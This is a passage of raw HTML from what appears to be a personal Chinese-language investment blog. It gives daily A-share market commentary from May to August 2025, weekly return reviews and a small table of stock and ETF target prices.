src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250812.png" srcset="/img/loading.gif" lazyload></p><h3 id="8月11日-周一"><a href="#8月11日-周一" class="headerlink" title="8月11日 周一"></a>8月11日 周一</h3><h4 id="A股-23"><a href="#A股-23" class="headerlink" title="A股"></a>A股</h4><p>指数继续向前高逼近，流动性十分充裕，短期剧本未定，关注盘面做好应对。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250811.png" srcset="/img/loading.gif" lazyload></p><h3 id="8月8日-周五"><a href="#8月8日-周五" class="headerlink" title="8月8日 周五"></a>8月8日 周五</h3><h4 id="A股-24"><a href="#A股-24" class="headerlink" title="A股"></a>A股</h4><p>高位股大幅分歧，指数小幅回调，雅下水电概念似有二波预期，但延续性和广度肯定不如第一波，警惕没有主线后的泥沙俱下。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250808.png" srcset="/img/loading.gif" lazyload></p><h3 id="8月7日-周四"><a href="#8月7日-周四" class="headerlink" title="8月7日 周四"></a>8月7日 周四</h3><h4 id="A股-25"><a href="#A股-25" class="headerlink" title="A股"></a>A股</h4><p>本轮大级别反弹的支柱CPO似有走弱迹象，但短期崩盘很难出现。融资盘续创新高，板块轮动还在继续。如果指数破924前高，证券可能带领指数继续冲锋，引来场外山呼海啸的买盘，要盯紧大盘异动，同时降低持仓风险。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250807.png" srcset="/img/loading.gif" lazyload></p><h3 id="8月6日-周三"><a href="#8月6日-周三" class="headerlink" title="8月6日 周三"></a>8月6日 周三</h3><h4 id="A股-26"><a href="#A股-26" class="headerlink" title="A股"></a>A股</h4><p>军工机器人题材活跃，成交量有所放大，继续以轮动的结构性行情看待短期未来。</p><h3 id="8月5日-周二"><a href="#8月5日-周二" class="headerlink" title="8月5日 周二"></a>8月5日 周二</h3><h4 id="A股-27"><a href="#A股-27" class="headerlink" title="A股"></a>A股</h4><p>指数延续强势，情绪股继续向上打出高度，但并没有主线引导，可能是杠杆资金长鞭效应行情，短期内考虑部分板块止盈。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250805.png" srcset="/img/loading.gif" lazyload></p><h3 id="8月4日-周一"><a href="#8月4日-周一" class="headerlink" title="8月4日 周一"></a>8月4日 周一</h3><h4 id="A股-28"><a href="#A股-28" class="headerlink" title="A股"></a>A股</h4><p>股市超预期强势，受外围影响大幅低开后拉升翻红，题材继续活跃，但成交量和主线均没有出现，继续做低吸策略。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250804.png" srcset="/img/loading.gif" lazyload></p><h3 id="8月2日-周六"><a href="#8月2日-周六" class="headerlink" title="8月2日 周六"></a>8月2日 周六</h3><h4 id="策略"><a href="#策略" class="headerlink" title="策略"></a>策略</h4><table><thead><tr><th align="center">股票</th><th align="center">目标价</th><th align="center">涨幅</th><th align="center">买入时机</th></tr></thead><tbody><tr><td align="center">比亚迪</td><td align="center">120-125</td><td align="center">10%～15%</td><td align="center">中报披露之前</td></tr><tr><td align="center">军工龙头ETF</td><td align="center">0.800</td><td align="center">10%～15%</td><td align="center">跟随大盘回踩20日均线附近</td></tr><tr><td align="center">港股创新药ETF</td><td align="center">1.500</td><td align="center">10%～15%</td><td align="center">跟随大盘回踩20日均线附近</td></tr></tbody></table><h3 id="8月1日-周五"><a href="#8月1日-周五" class="headerlink" title="8月1日 周五"></a>8月1日 周五</h3><h4 id="A股-29"><a href="#A股-29" class="headerlink" title="A股"></a>A股</h4><p>商品继续暴跌，前期高标大幅回调，全球股市翻绿，可能是黄金坑的左侧买入机会。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250801.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月31日-周四"><a href="#7月31日-周四" class="headerlink" title="7月31日 周四"></a>7月31日 周四</h3><h4 id="A股-30"><a href="#A股-30" class="headerlink" title="A股"></a>A股</h4><p>商品全线暴跌，顶级发言并没有新的表达，当前炒作的逻辑部分证伪，警惕市场风险，港A商品联动走弱和国债上涨，回踩级别可能不会小。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250731.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月30日-周三"><a href="#7月30日-周三" class="headerlink" title="7月30日 周三"></a>7月30日 周三</h3><h4 id="A股-31"><a href="#A股-31" class="headerlink" title="A股"></a>A股</h4><p>盘中大幅跳水，前期高标重挫，权重强撑指数，继续观察是出现见顶信号还是题材继续接力。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250730.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月29日-周二"><a href="#7月29日-周二" class="headerlink" title="7月29日 周二"></a>7月29日 周二</h3><h4 id="A股-32"><a href="#A股-32" class="headerlink" title="A股"></a>A股</h4><p>雅下水电概念下午大幅拉升后回落，流动性充裕，但银行已到60日线，谨防盘面风格切换。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250729.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月28日-周一"><a href="#7月28日-周一" class="headerlink" title="7月28日 周一"></a>7月28日 周一</h3><h4 id="A股-33"><a href="#A股-33" class="headerlink" title="A股"></a>A股</h4><p>题材继续走强，反内卷概念受商品压制有所回落，适度减小仓位等待顶级会议政策落地。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250728.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月25日-周五"><a href="#7月25日-周五" class="headerlink" title="7月25日 周五"></a>7月25日 周五</h3><h4 id="A股-34"><a href="#A股-34" class="headerlink" title="A股"></a>A股</h4><p>资源商品期货依然坚挺，但反内卷概念股震荡回调，科创进入补涨区间，大风险还未显现，继续观察核心指标。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250725.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月24日-周四"><a href="#7月24日-周四" class="headerlink" title="7月24日 周四"></a>7月24日 周四</h3><h4 id="A股-35"><a href="#A股-35" class="headerlink" title="A股"></a>A股</h4><p>指数放量站稳3600点，题材活跃，近期适当止盈以防利好兑现和资金风格切换。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250724.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月23日-周三"><a href="#7月23日-周三" class="headerlink" title="7月23日 周三"></a>7月23日 周三</h3><h4 id="A股-36"><a href="#A股-36" class="headerlink" title="A股"></a>A股</h4><p>指数上冲3600点后大幅回落，量能充沛，仙人指路。</p><h3 id="7月22日-周二"><a href="#7月22日-周二" class="headerlink" title="7月22日 周二"></a>7月22日 周二</h3><h4 id="A股-37"><a href="#A股-37" class="headerlink" title="A股"></a>A股</h4><p>科技资金被基建煤炭虹吸，观察持续性，谨防权重拉升带崩情绪和天量滞涨的情况。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250722.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月21日-周一"><a href="#7月21日-周一" class="headerlink" title="7月21日 周一"></a>7月21日 周一</h3><h4 id="A股-38"><a href="#A股-38" class="headerlink" title="A股"></a>A股</h4><p>雅江水电站推动题材炒作，大盘突破前期高点，当前时间周期还在炒作区间，继续持筹，做好止盈。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250721.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月18日-周五"><a href="#7月18日-周五" class="headerlink" title="7月18日 周五"></a>7月18日 周五</h3><h4 id="A股-39"><a href="#A股-39" class="headerlink" title="A股"></a>A股</h4><p>题材良性轮动，时间周期还未发生根本逆转，继续以持筹待涨思路运行。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250718.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月17日-周四"><a href="#7月17日-周四" class="headerlink" title="7月17日 周四"></a>7月17日 周四</h3><h4 id="A股-40"><a href="#A股-40" class="headerlink" title="A股"></a>A股</h4><p>题材爆发，战时状态的炒作预期还在继续，成交量没有明显萎缩时继续保持进攻风格。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250717.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月16日-周三"><a href="#7月16日-周三" class="headerlink" title="7月16日 周三"></a>7月16日 周三</h3><h4 id="A股-41"><a href="#A股-41" class="headerlink" title="A股"></a>A股</h4><p>围绕创新药、CPO、稳定币、军工和反内卷的题材炒作还会持续，注意轮动节奏，做好高低切换。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250716.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月15日-周二"><a href="#7月15日-周二" class="headerlink" title="7月15日 周二"></a>7月15日 周二</h3><h4 id="A股-42"><a href="#A股-42" class="headerlink" title="A股"></a>A股</h4><p>轮动还在继续，时间周期发生逆转之前是要拿住股票。</p><h3 id="7月14日-周一"><a href="#7月14日-周一" class="headerlink" title="7月14日 周一"></a>7月14日 周一</h3><h4 id="A股-43"><a href="#A股-43" class="headerlink" title="A股"></a>A股</h4><p>题材轮动持续，资金成交活跃，但大科技和大消费不够强势，继续以高抛低吸为主，耐心持筹等待炒作。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250714.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月4日-周五"><a href="#7月4日-周五" class="headerlink" title="7月4日 周五"></a>7月4日 周五</h3><h4 id="A股-44"><a href="#A股-44" class="headerlink" title="A股"></a>A股</h4><p>午后指数大幅冲高回落，多空对决上演，近期建议减少平均仓位，谨防指数大级别变盘向下。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250704.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月3日-周四"><a href="#7月3日-周四" class="headerlink" title="7月3日 周四"></a>7月3日 周四</h3><h4 id="A股-45"><a href="#A股-45" class="headerlink" title="A股"></a>A股</h4><p>关税利好刺激，题材再度大涨，轮动还会继续。</p><h3 id="7月2日-周三"><a href="#7月2日-周三" class="headerlink" title="7月2日 周三"></a>7月2日 周三</h3><h4 id="A股-46"><a href="#A股-46" class="headerlink" title="A股"></a>A股</h4><p>前期高位股大幅退潮，原材料大涨，科技下跌，题材还没有完全走弱，继续持仓观察。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250702.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月1日-周二"><a href="#7月1日-周二" class="headerlink" title="7月1日 周二"></a>7月1日 周二</h3><h4 id="A股-47"><a href="#A股-47" class="headerlink" title="A股"></a>A股</h4><p>行情轮动，创新药化工大涨，军工稳定币分化回调，切忌追涨，买入回调到位的主线题材。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250701.png" srcset="/img/loading.gif" lazyload></p><h3 id="6月30日-周一"><a href="#6月30日-周一" class="headerlink" title="6月30日 周一"></a>6月30日 周一</h3><h4 id="A股-48"><a href="#A股-48" class="headerlink" title="A股"></a>A股</h4><p>军工领涨，科技大面积上涨，明日可能会现分歧，做好高位止盈和题材轮动布局。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250630.png" srcset="/img/loading.gif" lazyload></p><h3 id="6月27日-周五"><a href="#6月27日-周五" class="headerlink" title="6月27日 周五"></a>6月27日 周五</h3><h4 id="A股-49"><a href="#A股-49" class="headerlink" title="A股"></a>A股</h4><p>银行带领下跌，指数向上动力不足，但题材轮动还会继续。</p><h3 id="6月26日-周四"><a href="#6月26日-周四" class="headerlink" title="6月26日 周四"></a>6月26日 周四</h3><h4 id="A股-50"><a href="#A股-50" class="headerlink" title="A股"></a>A股</h4><p>指数冲高回落收跌，但成交活跃度上升是好现象，短期题材炒作还会延续，把握市场主要题材。</p><h3 id="6月25日-周三"><a href="#6月25日-周三" class="headerlink" title="6月25日 周三"></a>6月25日 周三</h3><h4 id="A股-51"><a href="#A股-51" class="headerlink" title="A股"></a>A股</h4><p>大金融暴涨，牛市旗手带动大盘冲锋，前期跑团方向大幅回调，但目前没有重大利好，拐点预期还未出现，继续持筹等待选择方向。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250625.png" srcset="/img/loading.gif" lazyload></p><h3 id="6月24日-周二"><a href="#6月24日-周二" class="headerlink" title="6月24日 周二"></a>6月24日 周二</h3><h4 id="A股-52"><a href="#A股-52" class="headerlink" title="A股"></a>A股</h4><p>以伊停火，指数大涨突破3400点，前期活跃题材科技消费金融轮番大涨，短期内下跌反包概率缩小，但要做好高抛止盈。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250624.png" srcset="/img/loading.gif" lazyload></p><h3 id="6月23日-周一"><a href="#6月23日-周一" class="headerlink" title="6月23日 周一"></a>6月23日 周一</h3><h4 id="A股-53"><a href="#A股-53" class="headerlink" title="A股"></a>A股</h4><p>伊朗威胁关闭海峡，但资金并未开始计价利空，反而积极做多，在当前局势不明朗下要做好短线止盈。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250623.png" srcset="/img/loading.gif" lazyload></p><h3 id="6月21日-周六"><a href="#6月21日-周六" class="headerlink" title="6月21日 周六"></a>6月21日 周六</h3><h4 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h4><table><thead><tr><th align="center">日期</th><th align="center">6月16日至6月20日</th></tr></thead><tbody><tr><td align="center"><strong>收益率</strong></td><td align="center">-8.38%</td></tr><tr><td align="center"><strong>三大指数</strong></td><td align="center">-0.51% -1.16% -1.66%</td></tr><tr><td align="center"><strong>领涨板块</strong></td><td align="center">采掘行业（5.36%）燃气（3.45%）船舶制造（3.43%）</td></tr><tr><td align="center"><strong>总结</strong></td><td align="center">前期抱团品种均大幅回调，指数打开下行空间，但题材炒作在高位充分换手后还会延续</td></tr><tr><td align="center"><strong>策略</strong></td><td align="center">继续坚持投资组合，下半年可以博弈升波行情，稳定币新消费和科技题材还会延续</td></tr></tbody></table><h3 id="6月20日-周五"><a href="#6月20日-周五" class="headerlink" title="6月20日 周五"></a>6月20日 周五</h3><h4 id="A股-54"><a href="#A股-54" class="headerlink" title="A股"></a>A股</h4><p>中东局势不明朗，大资金借机做超涨抛售，指数拐点还未到达，继续观察以新消费为主的抱团何时修复。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250620.png" srcset="/img/loading.gif" lazyload></p><h3 id="6月19日-周四"><a href="#6月19日-周四" class="headerlink" title="6月19日 周四"></a>6月19日 周四</h3><h4 id="A股-55"><a href="#A股-55" class="headerlink" title="A股"></a>A股</h4><p>指数突发利空大跌，前期高位品种瓦解，继续做趋势品种。</p><h3 id="6月18日-周三"><a href="#6月18日-周三" class="headerlink" title="6月18日 周三"></a>6月18日 周三</h3><h4 id="A股-56"><a href="#A股-56" class="headerlink" title="A股"></a>A股</h4><p>指数受到护盘资金支撑，题材有所退潮，市场主线持续性存疑，开始做中长期趋势。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250618.png" srcset="/img/loading.gif" lazyload></p><h3 id="6月17日-周二"><a href="#6月17日-周二" class="headerlink" title="6月17日 周二"></a>6月17日 周二</h3><h4 id="A股-57"><a href="#A股-57" class="headerlink" title="A股"></a>A股</h4><p>港股消费高标ppmt无抵抗式下跌，暂时无法判断是趋势的一致性走弱还是回调整理，继续持股等待，切忌高频切换。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250617.png" srcset="/img/loading.gif" lazyload></p><h3 id="6月16日-周一"><a href="#6月16日-周一" class="headerlink" title="6月16日 周一"></a>6月16日 周一</h3><h4 id="A股-58"><a href="#A股-58" class="headerlink" title="A股"></a>A股</h4><p>金融会议在即，无论利好符合预期与否，指数均会有所升波，在趋势股和趋势题材做反复做高抛低吸，提高利润空间。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250616.png" srcset="/img/loading.gif" lazyload></p><h3 id="6月14日-周六"><a href="#6月14日-周六" class="headerlink" title="6月14日 周六"></a>6月14日 周六</h3><h4 id="复盘-1"><a href="#复盘-1" class="headerlink" title="复盘"></a>复盘</h4><table><thead><tr><th align="center">日期</th><th align="center">6月9日至6月13日</th></tr></thead><tbody><tr><td align="center"><strong>收益率</strong></td><td align="center">-5.54%</td></tr><tr><td align="center"><strong>三大指数</strong></td><td align="center">-0.25% -0.60% 0.22%</td></tr><tr><td align="center"><strong>领涨板块</strong></td><td align="center">采掘行业（10.97%）小金属（9.13%）贵金属（8.03%）</td></tr><tr><td align="center"><strong>总结</strong></td><td align="center">对抗加剧，地缘冲突爆发，资源股和贵金属资产表现较好，短期指数增波，侧重逆向思维和坚定持有</td></tr><tr><td align="center"><strong>策略</strong></td><td align="center">做好下杀后的修复预期，博弈T+0ETF和超短线</td></tr></tbody></table><h3 id="6月13日-周五"><a href="#6月13日-周五" class="headerlink" title="6月13日 周五"></a>6月13日 周五</h3><h4 id="A股-59"><a href="#A股-59" class="headerlink" title="A股"></a>A股</h4><p>中东局势突变，A股全面下跌买单，目前观察战争计价是否可持续，若无加剧则下周存在修复空间。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250613.png" srcset="/img/loading.gif" lazyload></p><h3 id="6月12日-周四"><a href="#6月12日-周四" class="headerlink" title="6月12日 周四"></a>6月12日 周四</h3><h4 id="A股-60"><a href="#A股-60" class="headerlink" title="A股"></a>A股</h4><p>创新药继续强势表现，核电盘中拉起，盲盒经济等新消费盘中巨震，资金合力不足，在当前震荡区间对于炒作题材继续以买跌不买涨为主要策略。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250612.png" srcset="/img/loading.gif" lazyload></p><h3 id="6月11日-周三"><a href="#6月11日-周三" class="headerlink" title="6月11日 周三"></a>6月11日 周三</h3><h4 id="A股-61"><a href="#A股-61" class="headerlink" title="A股"></a>A股</h4><p>指数缩量修复站上3400点，权重搭台，但题材没有表现，科技股弱势修复，妖股大幅下跌，如果行情出现持续性，成交量放出且证券科技轮番表现则可能是真突破行情，如果继续缩量则很可能回落震荡。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250611.png" srcset="/img/loading.gif" lazyload></p><h3 id="6月10日-周二"><a href="#6月10日-周二" class="headerlink" title="6月10日 周二"></a>6月10日 周二</h3><h4 id="A股-62"><a href="#A股-62" class="headerlink" title="A股"></a>A股</h4><p>中科曙光复牌也没有带动科技反弹，资金继续炒作医药新消费，直到泡泡玛特出现盘中巨震可能预示着节奏的变化。盘中利空导致指数跳水，但权重指数并未放量，而是1000和2000的题材小盘股出现分歧，后三个交易日的题材情绪是关键。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250610.png" srcset="/img/loading.gif" lazyload></p><h3 id="6月9日-周一"><a href="#6月9日-周一" class="headerlink" title="6月9日 周一"></a>6月9日 周一</h3><h4 id="A股-63"><a href="#A股-63" class="headerlink" title="A股"></a>A股</h4><p>A股上冲3400点回落，新消费继续强势，科技小幅震荡，但成交活跃，妖股继续炒作，在当前贸易磋商时期大资金以维稳为主，情绪预期较好，可以适当博弈。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250609.png" srcset="/img/loading.gif" lazyload></p><h3 id="6月7日-周六"><a href="#6月7日-周六" class="headerlink" title="6月7日 周六"></a>6月7日 周六</h3><h4 id="复盘-2"><a href="#复盘-2" class="headerlink" title="复盘"></a>复盘</h4><table><thead><tr><th align="center">日期</th><th align="center">6月3日至6月6日</th></tr></thead><tbody><tr><td align="center"><strong>收益率</strong></td><td align="center">6.32%</td></tr><tr><td align="center"><strong>三大指数</strong></td><td align="center">1.13% 1.42% 2.32%</td></tr><tr><td align="center"><strong>领涨板块</strong></td><td align="center">贵金属（6.79%）多元金融（6.48%）家用轻工（4.96%）</td></tr><tr><td align="center"><strong>总结</strong></td><td align="center">资金在消费和科技之间反复轮动，但没有持续的增量资金带领走出突破行情，短线行情难以预测，在没有重大事件的刺激下难以提高波动率，但下跌空间也十分有限</td></tr><tr><td align="center"><strong>策略</strong></td><td align="center">以抄底有修复预期的趋势股和及时止盈反复做T为主要操作思路</td></tr></tbody></table><h3 id="6月6日-周五"><a href="#6月6日-周五" class="headerlink" title="6月6日 周五"></a>6月6日 周五</h3><h4 id="A股-64"><a href="#A股-64" class="headerlink" title="A股"></a>A股</h4><p>A股成交回归缩量，科技行情一轮游，指数突破行情还未见眉目，但向下震荡的可能性存在，谨慎做多科技和指数型题材。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250606.png" srcset="/img/loading.gif" lazyload></p><h3 id="6月5日-周四"><a href="#6月5日-周四" class="headerlink" title="6月5日 周四"></a>6月5日 周四</h3><h4 id="A股-65"><a href="#A股-65" class="headerlink" title="A股"></a>A股</h4><p>成交活跃度增加，交易胜率提高，消费受港股三巨头大跌重挫，资金切换到低位科技，科技短期进入上升趋势，但延续性存疑，做好止盈止损。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250605.png" srcset="/img/loading.gif" lazyload></p><h3 id="6月4日-周三"><a href="#6月4日-周三" class="headerlink" title="6月4日 周三"></a>6月4日 周三</h3><h4 id="A股-66"><a href="#A股-66" class="headerlink" title="A股"></a>A股</h4><p>宠物经济、珠宝首饰、创新药等新消费继续大涨吸收科技资金，月初活跃题材确立，注意做好止盈和低吸。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250604.png" srcset="/img/loading.gif" lazyload></p><h3 id="6月3日-周二"><a href="#6月3日-周二" class="headerlink" title="6月3日 周二"></a>6月3日 周二</h3><h4 id="A股-67"><a href="#A股-67" class="headerlink" title="A股"></a>A股</h4><p>五月活跃的珠宝首饰、创新药、军工继续活跃，科技题材继续沉寂，指数依然看震荡向下，做好高抛低吸。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250603.png" srcset="/img/loading.gif" lazyload></p><h3 id="5月30日-周五"><a href="#5月30日-周五" class="headerlink" title="5月30日 周五"></a>5月30日 周五</h3><h4 id="A股-68"><a href="#A股-68" class="headerlink" title="A股"></a>A股</h4><p>高标股退潮，节前效应尽显，等待六月炒作题材出现。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250530.png" srcset="/img/loading.gif" lazyload></p><h3 id="5月29日-周四"><a href="#5月29日-周四" class="headerlink" title="5月29日 周四"></a>5月29日 周四</h3><h4 id="A股-69"><a href="#A股-69" class="headerlink" title="A股"></a>A股</h4><p>市场在关税利好催化下惯性反弹，但延续性存疑，耐心观察，等待资金开始下一周期的题材炒作。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250529.png" srcset="/img/loading.gif" lazyload></p><h3 id="5月28日-周三"><a href="#5月28日-周三" class="headerlink" title="5月28日 周三"></a>5月28日 周三</h3><h4 id="A股-70"><a href="#A股-70" class="headerlink" title="A股"></a>A股</h4><p>权重撑盘，科技继续弱势表现，成交不活跃时资金难以持续发动行情，继续等待确定性机会出现。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250528.png" srcset="/img/loading.gif" lazyload></p><h3 id="5月27日-周二"><a href="#5月27日-周二" class="headerlink" title="5月27日 周二"></a>5月27日 周二</h3><h4 id="A股-71"><a href="#A股-71" class="headerlink" title="A股"></a>A股</h4><p>指数继续震荡下跌，成交量首破一万亿，题材继续上演一日游，短期继续等待指数补缺。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250527.png" srcset="/img/loading.gif" lazyload></p><h3 id="5月26日-周一"><a href="#5月26日-周一" class="headerlink" title="5月26日 周一"></a>5月26日 周一</h3><h4 id="A股-72"><a href="#A股-72" class="headerlink" title="A股"></a>A股</h4><p>海光信息与中科曙光合并大消息催化AI算力板块反弹，但成交缩量，题材没有持续性，继续把控节奏做好买跌卖涨。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250526.png" srcset="/img/loading.gif" lazyload></p><h3 id="5月25日-周日"><a href="#5月25日-周日" class="headerlink" title="5月25日 周日"></a>5月25日 周日</h3><h4 id="复盘-3"><a href="#复盘-3" class="headerlink" title="复盘"></a>复盘</h4><table><thead><tr><th align="center">日期</th><th align="center">5月19日至5月23日</th></tr></thead><tbody><tr><td align="center"><strong>收益率</strong></td><td align="center">-5.23%</td></tr><tr><td align="center"><strong>三大指数</strong></td><td align="center">-0.57% -0.46% -0.88%</td></tr><tr><td align="center"><strong>领涨板块</strong></td><td align="center">珠宝首饰（7.82%）贵金属（6.60%）生物制品（3.90%）</td></tr><tr><td align="center"><strong>总结</strong></td><td align="center">受520节日催化和黄金价格止跌反弹，以及创新药估值修复催化，板块有所表现，但科技题材均出现回调，五穷六绝行情或将继续上演，指数步入回调周期，缩量瀑布杀之后才能出现下一次机会</td></tr><tr><td align="center"><strong>策略</strong></td><td align="center">继续持有估值合理成长股，除非均线技术指标彻底走弱考虑持币规避风险</td></tr></tbody></table><h3 id="5月23日-周五"><a href="#5月23日-周五" class="headerlink" title="5月23日 周五"></a>5月23日 周五</h3><h4 id="A股-73"><a href="#A股-73" class="headerlink" title="A股"></a>A股</h4><p>五穷六绝行情演绎，政策处于空窗期，全球资本市场空头可能会大举反扑，静待见底信号出现。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250523.png" srcset="/img/loading.gif" lazyload></p><h3 id="5月22日-周四"><a href="#5月22日-周四" class="headerlink" title="5月22日 周四"></a>5月22日 周四</h3><h4 id="A股-74"><a href="#A股-74" class="headerlink" title="A股"></a>A股</h4><p>科技股极度缩量，小盘股领跌，指数有继续向下的动能，继续做好单吊做T和风险规避。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250522.png" srcset="/img/loading.gif" lazyload></p><h3 id="5月21日-周三"><a href="#5月21日-周三" class="headerlink" title="5月21日 周三"></a>5月21日 周三</h3><h4 id="A股-75"><a href="#A股-75" class="headerlink" title="A股"></a>A股</h4><p>权重补涨，A50大涨但小盘股齐跌，市场没有主线出现，等待下跌充分后布局科技。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250521.png" srcset="/img/loading.gif" lazyload></p><h3 id="5月20日-周二"><a href="#5月20日-周二" class="headerlink" title="5月20日 周二"></a>5月20日 周二</h3><h4 id="A股-76"><a href="#A股-76" class="headerlink" title="A股"></a>A股</h4><p>科技题材窄幅震荡，高位股显著退潮，警惕下旬的大阴棒，继续耐心等待回调。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250520.png" srcset="/img/loading.gif" lazyload></p><h3 id="5月19日-周一"><a href="#5月19日-周一" class="headerlink" title="5月19日 周一"></a>5月19日 周一</h3><h4 id="A股-77"><a href="#A股-77" class="headerlink" title="A股"></a>A股</h4><p>题材反抽，但指数依旧窄幅震荡，抱团情绪浓烈，继续回避指数型股票。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250519.png" srcset="/img/loading.gif" lazyload></p><h3 id="5月16日-周五"><a href="#5月16日-周五" class="headerlink" title="5月16日 周五"></a>5月16日 周五</h3><h4 id="A股-78"><a href="#A股-78" class="headerlink" title="A股"></a>A股</h4><p>行情寡淡，继续持仓观察。</p><h3 id="5月15日-周四"><a href="#5月15日-周四" class="headerlink" title="5月15日 周四"></a>5月15日 周四</h3><h4 id="A股-79"><a href="#A股-79" class="headerlink" title="A股"></a>A股</h4><p>股指交割前日，出现股金大宗齐跌局面，降低指数预期，博弈超跌反弹，积极布局防守板块和贵金属资产。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250515.png" srcset="/img/loading.gif" lazyload></p><h3 id="5月14日-周三"><a href="#5月14日-周三" class="headerlink" title="5月14日 周三"></a>5月14日 